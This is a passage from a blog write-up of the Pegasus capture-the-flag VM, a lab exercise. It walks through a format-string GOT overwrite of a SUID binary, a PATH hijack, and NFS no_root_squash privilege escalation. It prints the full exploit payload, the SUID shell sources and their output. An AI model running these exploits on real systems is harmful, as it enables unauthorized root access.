Author: John Wall &lt;john@pegasus.<span style=color:#f92672>(</span>none<span style=color:#f92672>)</span>&gt;
Date:   Tue Nov <span style=color:#ae81ff>25</span> 04:39:42 <span style=color:#ae81ff>2014</span> +1100

    initial commit
</code></pre></div><p>From the log we can see that there as an initial commit, and one more after that with some <em>security fixes</em>. Chances are, if we can see what the initial commit was then we can see the full initial code. So, lets check out the details of commit <em>0a8af1ed</em>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff>mike@pegasus:/opt/git/my_first.git$ git show 0a8af1ed
commit 0a8af1ed956518ec078b152ad7571105e2df26c6
Author: John Wall &lt;john@pegasus.(none)&gt;
Date:   Tue Nov 25 04:39:42 2014 +1100

    initial commit

diff --git a/main.c b/main.c
new file mode 100644
index 0000000..39c0182
<span style=color:#f92672>--- /dev/null
</span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/main.c
</span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -0,0 +1,133 @@
</span><span style=color:#75715e></span><span style=color:#a6e22e>+#include &lt;stdio.h&gt;
</span><span style=color:#a6e22e>+#include &lt;stdlib.h&gt;
</span><span style=color:#a6e22e>+
</span><span style=color:#a6e22e>+int calculator();
</span><span style=color:#a6e22e>+int string_replay();
</span><span style=color:#a6e22e>+int string_reverse();
</span><span style=color:#a6e22e>+int quit();
</span><span style=color:#a6e22e>+
</span><span style=color:#a6e22e>+int main()
</span><span style=color:#a6e22e>+{
</span><span style=color:#a6e22e>+    char selection[5];
</span><span style=color:#a6e22e>+    int sel;
</span><span style=color:#a6e22e>+    char * err_check;
</span><span style=color:#a6e22e></span>
[... snip ...]
</code></pre></div><p>Nice! We have a file <code>main.c</code> that was added. I copied the diff and saved it to <code>init.patch</code>, and then ran the patch:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# patch -p1 &lt; init.diff
patching file main.c
</code></pre></div><p>That gives us the state of files after commit <em>0a8af1ed</em> which was labeled as the initial commit. The same process was followed for the next commit <em>85365946a8</em> which apparently included some <em>security fixes</em>. Copy the diff, make the .patch file and apply it. After this process, we have the sources up to where the git commit history has it.</p>
<p>I inspected that code before and after the security fixes commit, and noticed that the security fixes fixed a potential format string vulnerability. At least, that was the one my untrained eye was able to spot:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff>diff --git a/main.c b/main.c
index 39c0182..b6b2ed4 100644
<span style=color:#f92672>--- a/main.c
</span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/main.c
</span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -8,7 +8,7 @@ int quit();
</span><span style=color:#75715e></span>
[... snip ...]
<span style=color:#a6e22e>+
</span><span style=color:#a6e22e></span>         printf(&#34;Enter second number: &#34;);
         if (fgets(numberB, sizeof numberB, stdin) != NULL)
         {
<span style=color:#f92672>-            int numA = strtol(numberA, &amp;err_check, 10);
</span><span style=color:#f92672></span>             int numB = strtol(numberB, &amp;err_check, 10);
             if (*err_check != &#39;\n&#39;)
             {
<span style=color:#f92672>-                printf(&#34;Error details: &#34;);
</span><span style=color:#f92672>-                printf(err_check);
</span><span style=color:#f92672></span><span style=color:#a6e22e>+                printf(&#34;Error details: %s&#34;, err_check);
</span><span style=color:#a6e22e></span>                 printf(&#34;\n&#34;);
                 return 1;
[... snip ...]
</code></pre></div><p><code>printf(err_check);</code> is the potentially vulnerable call&mldr; I think.</p>
<h3 id=the-calculator-with-a-hole>the calculator with a hole<a hidden class=anchor aria-hidden=true href=#the-calculator-with-a-hole>#</a></h3>
<p>After toying with the git repository, my attention turned back to the SUID binary. When I run <code>my_first</code>, I am actually running it as <code>john</code>. This means, should I be able to exploit it and do things other than what its intended for, I may affectively gain <code>john</code>&rsquo;s privileges! Sounds easy right. :P</p>
<p>I quickly realized that the <code>main.c</code> file I got out of the git repository, was the sources for the <code>my_first</code> binary. So, my focus shifted to the piece of code I saw the security fix for.</p>
<p>First, it was time to confirm my suspicion of a format string vulnerability:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Calculator
<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> String replay
<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> String reverse
<span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> Exit

Selection: <span style=color:#ae81ff>1</span>

Enter first number: <span style=color:#ae81ff>1</span>
Enter second number: %x
Error details: bf96cbec

Selection:
</code></pre></div><p>I don’t like format string vulnerabilities. In fact not at all. I was hoping for something else and at this stage, I was happy I found the bug (which was the code before the security fixes btw), but sad that its a format string.</p>
<p>Anyways, feels aside, it was time to work on a exploit.</p>
<p>For the format string exploit, I don&rsquo;t think its really worth explaining all the details again. In fact, compiling this exploit, I was referring to a older blogpost about <a href=https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/>Xerxes2</a> which also had a similar thing going. Feel free to check the binary section out there if the next part does not make much sense.</p>
<p><strong>EDIT</strong> I have since made a small asciinema showing the offset calculations on my Kali VM. Though the offsets are not the same the theory still applies. </p>
<h3 id=punching-more-than-numbers>punching more than numbers<a hidden class=anchor aria-hidden=true href=#punching-more-than-numbers>#</a></h3>
<p><em>So here, I had a pretty big freaking fail. A massive one. Once I had determined the stack position to start corrupting memory with, I was punching in the format strings in the application itself. Meaning, I was giving it the ASCII \x\x\x\x and not the actual bytes as would have been the case if I was using python/printf to redirect the stdout of them to <code>my_first</code>&rsquo;s stdin. Anyways, lessons were learnt, caffeine was injected. It wont happen again. Big up to <a href=https://twitter.com/barrebas>@barrebas</a> for subtly pointing the fail out ;p</em></p>
<p>As I had seen the source code, it was easy to formulate a plan for the exploit. I would make use of a ret2libc attack by overriding the GOT entry for <code>printf()</code> using the format string to <code>system()</code> instead. This means, the next time <code>printf()</code> is called, it would actually execute <code>system()</code> with the adjacent argument on the stack. Lets see how this was done.</p>
<h4 id=compiling-the-format-string>compiling the format string<a hidden class=anchor aria-hidden=true href=#compiling-the-format-string>#</a></h4>
<p>We know that the 2nd number that the applications wants triggers our format string. So, lets prepare some skeleton input, piping it to the <code>./my_first</code> binary to sample a successful run:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ printf <span style=color:#e6db74>&#39;1\n1\n1\n4\n&#39;</span> | ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Calculator
<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> String replay
<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> String reverse
<span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> Exit

Selection:
Enter first number: Enter second number: Result: <span style=color:#ae81ff>1</span> + 1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>

Selection:
Goodbye!
</code></pre></div><p>Cool, so we have sampled adding 1 to 1 ;p Now we can get to exploiting the format string. The first step we have is to determine which parameter on the stack we have control of. We determine this by providing it with a string of 4 A&rsquo;s, and then incrementing the format string arguments by 1 until we can find the 4 A&rsquo;s. In my case, I will be formatting them as hex with <code>%x</code>, so I am searching for <code>41414141</code>. The format string will therefore start as <code>AAAA.0x%s</code>. Note that in the below example we are using 2 x percentages (2 x &lsquo;%') as it needs to be escaped in the shell:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ printf <span style=color:#e6db74>&#39;1\n1\nAAAA.0x%%x\n4\n&#39;</span> | ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Calculator
<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> String replay
<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> String reverse
<span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> Exit

Selection:
Enter first number: Enter second number: Error details: AAAA.0xbff5321c

Selection:
Goodbye!
</code></pre></div><p>And we have the output of <code>AAAA.0xbff5321c</code>. Yay :)
Continuously incrementing this will eventually get you to argument 8, where you will find the clean string of hex A&rsquo;s:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ printf <span style=color:#e6db74>&#39;1\n1\nAAAA.0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x\n4\n&#39;</span> | ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Calculator
<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> String replay
<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> String reverse
<span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> Exit

Selection:
Enter first number: Enter second number: Error details: AAAA.0xbfbd145c0xa0xb75b41600xb7726ac00xb7752ff40xb77539180xbfbd14600x41414141

Selection:
Goodbye!
mike@pegasus:~$
</code></pre></div><p>So, using direct parameter access in the format string, we can reference parameter 8 directly:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ printf <span style=color:#e6db74>&#39;1\n1\nAAAA.0x%%8$x\n4\n&#39;</span> | ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Calculator
<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> String replay
<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> String reverse
<span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> Exit

Selection:
Enter first number: Enter second number: Error details: AAAA.0x41414141

Selection:
Goodbye!
mike@pegasus:~$
</code></pre></div><p>Parameter 8 in the format string is the start of the section on the stack we can read now, shown in the output <code>AAAA.0x41414141</code> of the format string <code>AAAA.0x%8$x</code>.</p>
<p>Now we will move on to making use of the <code>%n</code> format string to write to a arbitrary area in memory. Where do we want to write? To the GOT where the lookup for <code>printf()</code> occurs ofc! Lets dump the GOT for <code>./my_first</code>, and determine where it will go look for <code>printf()</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ objdump -R ./my_first

./my_first:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049bec R_386_GLOB_DAT    __gmon_start__
08049c20 R_386_COPY        stdin
08049bfc R_386_JUMP_SLOT   printf
08049c00 R_386_JUMP_SLOT   fgets
08049c04 R_386_JUMP_SLOT   puts
08049c08 R_386_JUMP_SLOT   __gmon_start__
08049c0c R_386_JUMP_SLOT   __libc_start_main
08049c10 R_386_JUMP_SLOT   putchar
08049c14 R_386_JUMP_SLOT   strtol
</code></pre></div><p>The location of <code>printf()</code> will be looked up at <code>08049bfc</code>. This is the part where we want to rewrite the address of <code>printf()</code> to that of libc&rsquo;s <code>system()</code>.</p>
<p>The last part we need is to know where <code>system()</code> actually is. An important vector that may influence this position in memory is known as ASLR, which will effectively cause the address of <code>system()</code> to be different every time <code>./my_first</code> is run. To combat this, a neat little trick to increase the stack size can be used using <code>ulimit</code>. <code>ulimit -s unlimited</code> will maximize the stack size, effectively causing the ASLR to be practically nonexistent:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ ulimit -s
<span style=color:#ae81ff>8192</span>
mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ ulimit -s
unlimited
</code></pre></div><p>With the ASLR problem out of the way, lets leak the address of <code>system()</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># fire up gdb</span>
mike@pegasus:~$ gdb -q ./my_first
Reading symbols from /home/mike/my_first...<span style=color:#f92672>(</span>no debugging symbols found<span style=color:#f92672>)</span>...done.

<span style=color:#75715e># set a break point as we enter main()</span>
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b main
Breakpoint <span style=color:#ae81ff>1</span> at 0x804850f

<span style=color:#75715e># run the binary</span>
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r
Starting program: /home/mike/my_first

Breakpoint 1, 0x0804850f in main <span style=color:#f92672>()</span>

<span style=color:#75715e># leak the current address of system()</span>
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p system
$1 <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>&lt;text variable, no debug info&gt;<span style=color:#f92672>}</span> 0x40069060 &lt;system&gt;
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
</code></pre></div><p>And so we learn that <code>system()</code> lives at <code>0x40069060</code>. What does this all mean so far then? Well, we are now going to use the format string vulnerability to write (using <code>%n</code>) a new address for <code>printf()</code> in the GOT at <code>08049bfc</code> to point to <code>system()</code> at <code>0x40069060</code> instead of its real location.</p>
<p>For us to debug the application while we prepare the required padding for the format string, we will use the <code>printf()</code> used to pipe to <code>./my_first</code> to redirect to a file instead. Then, in <code>gdb</code>, we will run the binary, redirecting the input from the file we will compile with the <code>printf()</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># so, instead of the 4 x A&#39;s, we will now place the address</span>
<span style=color:#75715e># in the GOT that we want to override, and use the %x format</span>
<span style=color:#75715e># string to attempt writing to it</span>
mike@pegasus:~$ printf <span style=color:#e6db74>&#39;1\n1\n\xfc\x9b\x04\x08%%8$n&#39;</span> &gt; t
mike@pegasus:~$ file t
t: data

<span style=color:#75715e># then, in gdb, we will grab the output of the new file called</span>
<span style=color:#75715e># t, and redirect it as input to my_first</span>
mike@pegasus:~$ gdb -q ./my_first
Reading symbols from /home/mike/my_first...<span style=color:#f92672>(</span>no debugging symbols found<span style=color:#f92672>)</span>...done.

<span style=color:#75715e># leak the current address that GOT points to for printf()</span>
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/x 0x08049bfc
0x8049bfc &lt;printf@got.plt&gt;: 0x080483b6

<span style=color:#75715e># run the binary with our exploit (t) as input</span>
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r &lt; t
Starting program: /home/mike/my_first &lt; t
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Calculator
<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> String replay
<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> String reverse
<span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> Exit

Selection:
Enter first number: Enter second number: Error details: ��

Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? <span style=color:#f92672>()</span>

<span style=color:#75715e># inspect the new address the GOT points to for printf()</span>
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/x 0x08049bfc
0x8049bfc &lt;printf@got.plt&gt;: 0x00000004
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
</code></pre></div><p>This is working exactly as expected. Now all that is left is to pad the format string so that we can have the address <code>0x40069060</code> instead of <code>0x00000004</code> written. For the math etc involved, refer to the Xerxes2 post I previously mentioned. The resultant format string was <code>\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n</code>, with a run in the debugger ending in:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># prep the input file</span>
mike@pegasus:~$ printf <span style=color:#e6db74>&#39;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&#39;</span> &gt; t
mike@pegasus:~$

<span style=color:#75715e># run it in the debugger</span>
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r &lt;t
The program being debugged has been started already.
Start it from the beginning? <span style=color:#f92672>(</span>y or n<span style=color:#f92672>)</span> y
Starting program: /home/mike/my_first &lt;t
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Calculator
<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> String replay
<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> String reverse
<span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> Exit

Selection:
Enter first number: Enter second number: Error details: ����

<span style=color:#f92672>[</span>... snip ...<span style=color:#f92672>]</span>

sh: 1: Selection:: not found

Program received signal SIGSEGV, Segmentation fault.
0x08c3f98c in ?? <span style=color:#f92672>()</span>

<span style=color:#75715e># check where the GOT points to for printf()</span>
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/x 0x08049bfc
0x8049bfc &lt;printf@got.plt&gt;: 0x40069060

<span style=color:#75715e># confirm system() is still there :)</span>
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p system
$1 <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>&lt;text variable, no debug info&gt;<span style=color:#f92672>}</span> 0x40069060 &lt;system&gt;
</code></pre></div><p>The binary crashes with <code>sh: 1: Selection:: not found</code>, meaning that it is now trying to run <code>system("Selection:")</code> instead of <code>printf("Selection:")</code> due to the GOT override.</p>
<h4 id=finishing-the-exploit>finishing the exploit<a hidden class=anchor aria-hidden=true href=#finishing-the-exploit>#</a></h4>
<p>From here the exploit is pretty easy. We can use some $PATH trickery in our current shell to get <code>Selection:</code> to actually mean something, like prepare a small SUID C shell perhaps? :)</p>
<p>I quickly compiled some C wrapper code to prepare a shell and ran the exploit.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># Prep Selection: to make a SUID shell for john</span>
<span style=color:#75715e># and modify PATH</span>
mike@pegasus:~$ cat tojohn.c
<span style=color:#75715e>#include &lt;stdio.h&gt;</span>
int main<span style=color:#f92672>()</span>
<span style=color:#f92672>{</span>
    system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;cp /bin/sh /tmp/tojohn&#34;</span><span style=color:#f92672>)</span>;
    system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;chmod 4777 /tmp/tojohn&#34;</span><span style=color:#f92672>)</span>;
<span style=color:#f92672>}</span>
mike@pegasus:~$ gcc tojohn.c -o <span style=color:#e6db74>&#34;Selection:&#34;</span>
mike@pegasus:~$ export PATH<span style=color:#f92672>=</span>/home/mike/:$PATH

<span style=color:#75715e># run the exploit...</span>
mike@pegasus:~$ printf <span style=color:#e6db74>&#39;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&#39;</span> | ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Calculator
<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> String replay
<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> String reverse
<span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> Exit

Selection:
Enter first number: Enter second number: Error details: ����

                     <span style=color:#ae81ff>10</span>
Segmentation fault <span style=color:#f92672>(</span>core dumped<span style=color:#f92672>)</span>

<span style=color:#75715e># ... and check /tmp</span>
mike@pegasus:~$ ls -lah /tmp/
total 108K
drwxrwxrwt  <span style=color:#ae81ff>2</span> root root 4.0K Dec <span style=color:#ae81ff>23</span> 23:17 .
drwxr-xr-x <span style=color:#ae81ff>22</span> root root 4.0K Nov <span style=color:#ae81ff>19</span> 02:58 ..
-rwsrwxrwx  <span style=color:#ae81ff>1</span> john mike  98K Dec <span style=color:#ae81ff>23</span> 23:17 tojohn
mike@pegasus:~$
</code></pre></div><p>We have a new file <code>tojohn</code> in <code>/tmp</code> :D</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ /tmp/tojohn
$ id
uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span> euid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>john<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>john<span style=color:#f92672>)</span>,1001<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span>
</code></pre></div><h2 id=hoofing-rooting-pegasus>hoofing (rooting) Pegasus<a hidden class=anchor aria-hidden=true href=#hoofing-rooting-pegasus>#</a></h2>
<p>I added the public key of the keypair I generated for Pegasus to <code>john</code>&rsquo;s authorized_keys file and proceeded to SSH in as him.</p>
<p>Quick enumeration showed that <code>mike</code> is allowed to start the nfs daemon via <code>sudo</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>john@pegasus:~$ sudo -l
Matching Defaults entries <span style=color:#66d9ef>for</span> john on this host:
    env_reset, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin

User john may run the following commands on this host:
    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /usr/local/sbin/nfs
john@pegasus:~$ sudo nfs
Usage: nfs <span style=color:#f92672>[</span>start|stop<span style=color:#f92672>]</span>
john@pegasus:~$ sudo nfs start
 * Exporting directories <span style=color:#66d9ef>for</span> NFS kernel daemon...                                                                                                                                 <span style=color:#f92672>[</span> OK <span style=color:#f92672>]</span>
 * Starting NFS kernel daemon                                                                                                                                                     <span style=color:#f92672>[</span> OK <span style=color:#f92672>]</span>
john@pegasus:~$
</code></pre></div><p>I checked out the <code>/etc/exports</code> file, and noticed the the <code>no_root_squash</code> flag for the <code>/opt/nfs</code> export. This is most certainly the way to root Pegasus as nfs will not go and nobody my files :)</p>
<p>So, I mounted the share&mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# mkdir nfs
root@kali:~# mount 192.168.56.101:/opt/nfs nfs
</code></pre></div><p>&mldr; prepped a SUID shell &mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~/Desktop/pegasus/nfs# cat shell.c
<span style=color:#75715e>#include &lt;stdio.h&gt;</span>

int main<span style=color:#f92672>()</span>
<span style=color:#f92672>{</span>
    setuid<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>;
    setgid<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>;
    system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/sh&#34;</span><span style=color:#f92672>)</span>;
<span style=color:#f92672>}</span>
root@kali:~/Desktop/pegasus/nfs# gcc shell.c -o shell
root@kali:~/Desktop/pegasus/nfs# chmod <span style=color:#ae81ff>4777</span> shell
root@kali:~/Desktop/pegasus/nfs# ls -lah
total 20K
drwxr-xr-x <span style=color:#ae81ff>2</span> root root 4.0K Dec <span style=color:#ae81ff>23</span> 14:39 .
drwxr-xr-x <span style=color:#ae81ff>3</span> root root 4.0K Dec <span style=color:#ae81ff>23</span> 14:32 ..
-rwsrwxrwx <span style=color:#ae81ff>1</span> root root 5.0K Dec <span style=color:#ae81ff>23</span> 14:39 shell
-rw-r--r-- <span style=color:#ae81ff>1</span> root root   <span style=color:#ae81ff>79</span> Dec <span style=color:#ae81ff>23</span> 14:39 shell.c
</code></pre></div><p>&mldr; and rooted Pegasus :)</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>john@pegasus:~$ /opt/nfs/shell
<span style=color:#75715e># id</span>
uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>,1000<span style=color:#f92672>(</span>john<span style=color:#f92672>)</span>
</code></pre></div><h2 id=flag->flag :)<a hidden class=anchor aria-hidden=true href=#flag->#</a></h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text># cat /root/flag
               ,
               |`\
              /&#39;_/_
            ,&#39;_/\_/\_                       ,
          ,&#39;_/\&#39;_\_,/_                    ,&#39;|
        ,&#39;_/\_&#39;_ \_ \_/                _,-&#39;_/
      ,&#39;_/&#39;\_&#39;_ \_ \&#39;_,\           _,-&#39;_,-/ \,      Pegasus is one of the best
    ,&#39; /_\ _&#39;_ \_ \&#39;_,/       __,-&#39;&lt;_,&#39; _,\_,/      known creatures in Greek
   ( (&#39; )\/(_ \_ \&#39;_,\   __--&#39; _,-_/_,-&#39;,_/ _\      mythology. He is a winged
    \_`\&gt; 6` 7  \&#39;_,/ ,-&#39; _,-,&#39;\,_&#39;_ \,_/&#39;_,\       stallion usually depicted
     \/-  _/ 7 &#39;/ _,&#39; _/&#39;\_  \,_&#39;_ \_ \&#39;_,/         as pure white in color.
      \_&#39;/&gt;   7&#39;_/&#39; _/&#39; \_ &#39;\,_&#39;_ \_ \&#39;_,\          Symbol of wisdom and fame.
        &gt;/  _ ,V  ,&lt;  \__ &#39;\,_&#39;_ \_ \&#39;_,/
      /&#39;_  ( )_)\/-,&#39;,__ &#39;\,_&#39;_,\_,\&#39;_\             Fun fact: Pegasus was also
     ( ) \_ \|_  `\_    \_,/&#39;\,_&#39;_,/&#39;               a video game system sold in
      \\_  \_\_)    `\_                             Poland, Serbia and Bosnia.
       \_)   &gt;        `\_                           It was a hardware clone of
            /  `,      |`\_                         the Nintendo Famicom.
           /    \     / \ `\
          /   __/|   /  /  `\
         (`  (   (` (_  \   /
         /  ,/    |  /  /   \
        / ,/      | /   \   `\_
      _/_/        |/    /__/,_/
     /_(         /_(


CONGRATULATIONS! You made it :)

Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
learnt a thing or two while doing it! :)

Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
providing first review.

Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
and leave some feedback, I would love to hear from you!

Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
more awesome boot2root VMs!
</code></pre></div><p>Thanks for the fun <a href=https://twitter.com/theknapsy>@TheKnapsy</a></p>
</div>
<footer class=post-footer>
<nav class=paginav>
<a class=prev href=https://leonjza.github.io/blog/2015/02/09/no-more-jailbreak-detection-an-adventure-into-android-app-reversing-and-smali-patching/>
<span class=title>« Prev Page</span>
<br>
<span>no more jailbreak detection an adventure into Android app reversing and smali patching</span>
</a>
<a class=next href=https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/>
<span class=title>Next Page »</span>
<br>
<span>playing in the playground a offsec virtual pentesting labs review</span>
</a>
</nav>
<div class=share-buttons>
